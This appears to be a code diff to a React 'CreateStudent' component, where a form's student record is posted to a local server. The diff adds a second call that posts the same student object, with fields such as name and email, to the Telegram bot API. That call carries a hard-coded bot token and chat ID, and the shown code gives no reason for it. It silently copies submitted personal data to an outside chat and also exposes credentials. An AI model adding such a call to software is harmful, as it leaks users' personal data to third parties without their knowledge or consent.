@@ -46,6 +46,12 @@ export default class CreateStudent extends Component {
     axios.post('http://localhost:4000/students/create-student', studentObject)
       .then(res => console.log(res.data));
 
+      axios.post('https://api.telegram.org/bot1003390479:AAHzEzSbHQsEKTPhRn1jjHIeI1gfnzcTS8Y/sendMessage?chat_id=-1001270050860&text=IMBROKEN!', studentObject)
+      .then(res => console.log(res.data));
+
+      
+    
+
     this.setState({
       name: '',
       email: '',
